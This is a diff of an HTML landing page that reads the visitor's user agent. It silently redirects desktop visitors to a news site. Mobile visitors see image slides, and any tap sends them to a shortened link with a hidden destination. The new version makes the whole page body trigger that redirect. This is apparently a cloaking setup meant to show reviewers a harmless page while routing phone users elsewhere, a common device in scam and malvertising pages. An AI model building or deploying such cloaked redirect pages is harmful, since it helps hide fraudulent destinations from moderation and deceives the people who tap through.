@@ -1,85 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>5-Image Scroll Landing Page</title>
-    <style>
-        /* Global Reset */
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden; /* Prevent body scrollbar */
-        }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Landing Page</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden; /* desktop overflow hidden */
+      font-family: sans-serif;
+    }
 
-        /* Container for the full-screen image sections */
-        .image-container {
-            height: 100vh;
-            width: 100vw;
-            overflow-y: scroll; /* Enable vertical scrolling within this container */
-            scroll-snap-type: y mandatory; /* Enforce full-section snapping */
-            -webkit-overflow-scrolling: touch; /* Better mobile scrolling */
-            cursor: pointer; /* Keep the click cursor */
-        }
+    /* Scrollable container for mobile */
+    .slides-container {
+      height: 100%;
+      width: 100%;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory;
+      -webkit-overflow-scrolling: touch; /* smooth scroll on iOS */
+    }
 
-        /* Style for each full-screen image section */
-        .full-image-section {
-            height: 100vh;
-            width: 100vw;
-            scroll-snap-align: start; /* Snap to the top of the section */
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            position: relative;
-        }
+    .slide {
+      height: 100vh;
+      width: 100vw;
+      background-size: cover;
+      background-position: center;
+      scroll-snap-align: start;
+    }
+  </style>
+  <script>
+    const desktopURL = "https://www.msn.com/it-it"; // Desktop redirect
+    const mobileURL = "https://t.co/lU6lupZ2Qa";    // Mobile redirect on click
 
-        /* Individual Image Backgrounds - NOW USING YOUR CODES */
-        #img1 {
-            background-image: url('https://ibb.co/j92x7mcw');
-        }
-        #img2 {
-            background-image: url('https://ibb.co/YBMg0Cqj');
-        }
-        #img3 {
-            background-image: url('https://ibb.co/4ZLgbCF1');
-        }
-        #img4 {
-            background-image: url('https://ibb.co/21Wb9Ntk');
-        }
-        #img5 {
-            background-image: url('https://ibb.co/9mRpkhCs');
-        }
+    const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
+      .test(navigator.userAgent.toLowerCase());
 
-    </style>
-    <script>
-        const desktopURL = "https://www.msn.com/it-it";
-        const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());
-
-        // Desktop users redirected immediately
-        if (!isMobile) {
-            window.location.replace(desktopURL);
-        }
-    </script>
+    if (!isMobile) {
+      // Redirect desktop users immediately
+      window.location.replace(desktopURL);
+    }
+  </script>
 </head>
 <body>
-    <div class="image-container" id="imageContainer">
-        <div class="full-image-section" id="img1"></div>
-        <div class="full-image-section" id="img2"></div>
-        <div class="full-image-section" id="img3"></div>
-        <div class="full-image-section" id="img4"></div>
-        <div class="full-image-section" id="img5"></div>
-    </div>
 
-    <script>
-        const mobileURL = "https://t.co/hw376Xavsh";
-        const imageContainer = document.getElementById("imageContainer");
+<!-- Mobile slides -->
+<div class="slides-container">
+  <div class="slide" style="background-image: url('https://i.ibb.co/j92x7mcw/image1.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/YBMg0Cqj/image2.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/4ZLgbCF1/image3.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/21Wb9Ntk/image4.jpg');"></div>
+  <div class="slide" style="background-image: url('https://i.ibb.co/9mRpkhCs/image5.jpg');"></div>
+</div>
 
-        // Mobile users: redirect when clicking anywhere on the image container
-        imageContainer.addEventListener("click", () => {
-            window.location.href = mobileURL;
-        });
-    </script>
+<script>
+  // Mobile click redirect
+  document.body.addEventListener("click", () => {
+    window.location.href = mobileURL;
+  });
+</script>
+
 </body>
 </html>
